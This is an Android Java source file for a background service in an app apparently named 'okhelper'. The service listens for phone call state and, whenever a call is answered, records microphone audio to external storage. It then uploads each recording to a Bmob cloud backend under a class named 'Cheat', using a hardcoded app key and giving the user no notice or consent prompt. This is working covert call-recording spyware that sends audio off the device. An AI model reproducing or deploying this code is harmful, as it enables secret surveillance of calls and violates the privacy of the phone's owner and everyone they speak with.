package ooo.xxx.okhelper.services;

import java.io.File;

import cn.bmob.v3.Bmob;
import cn.bmob.v3.datatype.BmobFile;
import cn.bmob.v3.listener.UploadFileListener;
import ooo.xxx.okhelper.bean.Cheat;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneService extends Service {

	private TelephonyManager tm;
	private MyPhoneStateListener1 listener;
	private MediaRecorder mr;

	@Override
	public void onCreate() {
		super.onCreate();
		Bmob.initialize(this, "65e5589a2951bdfa2eb80ad0a2d35a85");

		tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		listener = new MyPhoneStateListener1();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);

	}

	private class MyPhoneStateListener1 extends PhoneStateListener {
		public void onCallStateChanged(int state, String incomingNumber) {
			switch (state) {

			case TelephonyManager.CALL_STATE_IDLE://闲置状态
				

				if (mr != null) {
					// if(incomingNumber.equals("5556")||incomingNumber.equals("15555215556")){
					mr.stop();
					mr.reset();
					mr.release();
					mr = null;

					// }
				}
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK://接听状态，进行录音监听
				
				try {

					mr = new MediaRecorder();
					mr.setAudioSource(MediaRecorder.AudioSource.MIC);
					mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

					
					String fileNameString = System.currentTimeMillis() + ".3gp";
					File file = new File(
							Environment.getExternalStorageDirectory(),
							fileNameString);
					String filePathString = file.getPath();
					mr.setOutputFile(file.getAbsolutePath());

					mr.prepare();
					mr.start();
					upload(filePathString);

				} catch (Exception e) {
					e.printStackTrace();
				}
				break;
			case TelephonyManager.CALL_STATE_RINGING://响铃状态
				
				break;
			default:
				break;
			}
		};
	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	/**
	 * 将文件上传
	 * 
	 * @param filepath
	 */
	private void upload(String filePath) {
		final BmobFile icon = new BmobFile(new File(filePath));
		icon.upload(this, new UploadFileListener() {

			@Override
			public void onSuccess() {//上传成功！
				Cheat name = new Cheat();
				name.setName(icon);
				name.save(getApplicationContext());
			}

			@Override
			public void onProgress(Integer arg0) {

			}

			@Override
			public void onFailure(int arg0, String arg1) {

			}
		});
	}

}